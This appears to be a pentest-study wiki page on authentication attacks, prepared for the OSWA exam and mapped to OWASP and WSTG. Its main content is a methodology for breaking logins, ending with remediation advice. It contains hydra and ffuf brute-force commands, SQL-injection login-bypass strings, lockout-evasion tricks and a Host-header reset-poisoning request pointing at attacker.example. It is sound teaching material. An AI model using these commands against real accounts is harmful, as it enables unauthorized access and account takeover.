---
type: technique
title: Authentication attacks
lang: en
status: active
wstg: ["WSTG-ATHN-02", "WSTG-ATHN-03", "WSTG-ATHN-04", "WSTG-ATHN-09", "WSTG-IDNT-04"]
owasp_top10: ["A07:2021"]
owasp_api: ["API2:2023"]
asvs: ["V6.3.1", "V6.3.2", "V6.3.8", "V6.4.3"]
cwe: ["CWE-287", "CWE-307", "CWE-620"]
attack: ["T1110", "T1078"]
cvss: ""
sources: [web-200-oswa, colleague-web-wiki]
updated: 2026-09-17
---

# Authentication attacks

**TL;DR** — Get into accounts by attacking the login and everything around it: default/weak
credentials, credential brute-forcing, authentication **bypass** (skip the check entirely),
and broken **password-reset / remember-me / MFA** flows. On an [[oswa-exam|OSWA]] box the
usual win is default creds or a bypass, or brute-forcing a login you've enumerated.

> Framework: **A07:2021 – Identification & Authentication Failures**, `API2:2023`,
> `CWE-287` (improper auth) / `CWE-307` (no brute-force limit) / `CWE-620` (unverified change).
> WSTG `WSTG-ATHN-02/03/04/09`, `WSTG-IDNT-04` (account enumeration).

## The attack surface

Login form and API, registration, **password reset**, "remember me" / persistent cookies,
account-lockout logic, MFA/OTP, and the session issued on success (see
[[samesite-cookies]] and session fixation). Test each — the reset flow is often weaker than
the login itself.

## 1. Default & weak credentials

Always try first. Vendor defaults (`admin:admin`, `admin:password`, `root:root`,
`tomcat:tomcat`, `admin:changeme`), product-specific defaults from the docs, and creds you
found via [[directory-traversal]]/[[lfi]] (config files) or [[ssrf]]/[[idor]] (leaked data).
Wordlists: SecLists `Passwords/Default-Credentials`.

## 2. Username / account enumeration

A different **message**, **status code**, response **length**, or **timing** for a valid vs.
invalid username leaks which accounts exist — build a user list before brute-forcing.

```bash
# ffuf: cluster the username, watch response size to spot "user exists" vs "no such user"
ffuf -w users.txt:UHOST -X POST -d 'user=UHOST&pass=x' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -u https://T/login -mode clusterbomb -of csv
# then filter by the size that differs (-fs / -ms), or read the message diff
```
Also mine registration ("username taken"), password reset ("no such email" vs "email sent"),
and timing (bcrypt only runs for real users). Cross-link [[cewl]] for site-derived names.

## 3. Credential brute-forcing

Respect lockout ([§4](#4-lockout--rate-limit-bypass)). Handle CSRF tokens and cookies.

```bash
# hydra against an HTTP POST login form. The 3rd field is the FAILURE string:
hydra -L users.txt -P rockyou.txt T http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# with a per-request CSRF token + session cookie:
hydra -l admin -P rockyou.txt T https-post-form \
  "/login:csrf=^CSRF^&user=^USER^&pass=^PASS^:F=Invalid:H=Cookie\: session=..:C=/login"
#   C=/login  -> fetch a fresh token/cookie each attempt ; ^CSRF^ auto-extracted

# ffuf equivalent (often easier for token handling): grab token+cookie, then fuzz pass
ffuf -w rockyou.txt:PW -X POST -b 'session=..' \
     -d 'csrf=<token>&user=admin&pass=PW' \
     -u https://T/login -fr 'Invalid credentials'   # -fr = filter the failure regex
```
Prefer **short, targeted** lists in an exam (default lists, seasonal patterns, `cewl` output)
over full `rockyou` — time and lockout matter.

## 4. Lockout / rate-limit bypass

- **IP rotation headers** the app trusts: `X-Forwarded-For`, `X-Real-IP`, `X-Client-IP` —
  change per request to reset a per-IP counter.
- **Password spraying** — one common password across many users stays under per-account
  lockout.
- **Case / null / whitespace** variants of a locked username sometimes dodge the counter.
- Lockout that only throttles the *response* but still processes the login → timing oracle.

## 5. Authentication bypass (skip the check)

- **Forced browsing** — request a post-login page directly (`/admin`, `/dashboard`); if it
  renders, auth isn't enforced there (broken access control — see [[idor]]).
- **Parameter/response tampering** — flip a client-trusted flag:
  ```http
  GET /page?authenticated=yes HTTP/1.1
  ```
  `admin=false`→`true`, `role=user`→`admin` in body/cookie/JWT; or intercept the *response*
  and change `"success":false`→`true` when the client decides.
- **SQL injection login bypass** — `admin'-- -` / `' OR 1=1 LIMIT 1-- -` (see
  [[sql-injection]] auth-bypass).
- **PHP loose comparison / magic hashes** — `==` on `0e…`-prefixed MD5 hashes compare equal;
  type-juggling on `strcmp`/`==` with arrays returns `NULL`/`0`.
- **Same-length password accepted** → wildcard/`LIKE` or reversible storage smell.
- **[[jwt-attacks|JWT flaws]]** — `alg:none`, weak-secret forgery, `kid` injection to
  impersonate any user.

## 6. Password reset & remember-me flaws

- **Host-header poisoning** — the reset email builds its link from the `Host`/`X-Forwarded-Host`
  header; set it to your server to capture the victim's token:
  ```http
  POST /reset HTTP/1.1
  Host: attacker.example
  ...
  email=victim@corp.tld
  ```
- **Predictable/guessable tokens** (timestamp, sequential, short) → brute or predict.
- **User-ID swap** — the reset confirm step trusts a `user`/`id` field you can change (IDOR on
  reset).
- **No old-password required** on change → CSRF/session-riding to set a new one.
- **Remember-me cookie** = reversible/guessable token (username+weak hash) → forge it.

## Worked example — enumerate then spray

1. **Enumerate:** the login returns "Invalid password" for a known-good user but "No such
   user" otherwise (WSTG-IDNT-04). `ffuf` the username field against SecLists common users,
   filter by the message → 6 valid accounts.
2. **Spray:** one seasonal password across the 6 (staying under lockout) with `hydra`
   password-spray mode → `support:Autumn2025!` succeeds.
3. **Login**, grab the session, and pivot to [[idor]] with the now-authenticated context. On
   [[web-200-oswa|WEB-200]]-style boxes, a leaked/weak admin credential is frequently the door
   to `local.txt`.

## Tooling

[[hydra]] (forms/basic-auth brute), [[ffuf]]/[[wfuzz]] (token-aware brute + enumeration),
[[cewl]] (site-derived wordlists), [[burp-suite|Burp]] Intruder (Pitchfork for user+pass,
macro for CSRF tokens), `john`/`hashcat` (crack captured hashes / [[jwt-attacks|JWT]] secrets).

## Confirming impact

Demonstrate an authenticated session as another user/admin (screenshot of their dashboard,
an action performed as them), or account takeover via the reset flow. Severity **High–Critical**
depending on the account reached.

## Remediation

- Enforce authentication on **every** protected route server-side; never trust a client flag,
  hidden field, or header for identity.
- Rate-limit + progressive lockout keyed correctly (not on a spoofable header); generic
  error messages (no user-enumeration oracle); constant-time credential comparison.
- Strong password storage (bcrypt/argon2 — see [[colleague-web-wiki|password-storage]]),
  MFA, high-entropy single-use reset tokens bound to the account, and reset links built from a
  server-fixed host, not the request header.

## Pitfalls

- Lockout can lock **you** out mid-exam — enumerate first, spray narrowly, watch the counter.
- CSRF tokens/cookies rotate per request → without re-fetching them every attempt, every
  guess "fails" for the wrong reason.

## See also

[[jwt-attacks]] · [[idor]] · [[sql-injection]] · [[hydra]] · [[ffuf]] · [[oswa-exam]]

*Sources: [[web-200-oswa]] (credential attacks in the methodology); [[colleague-web-wiki]] (WSTG-ATHN-04 bypass set: forced browsing, param tampering, magic hashes, same-length password).*
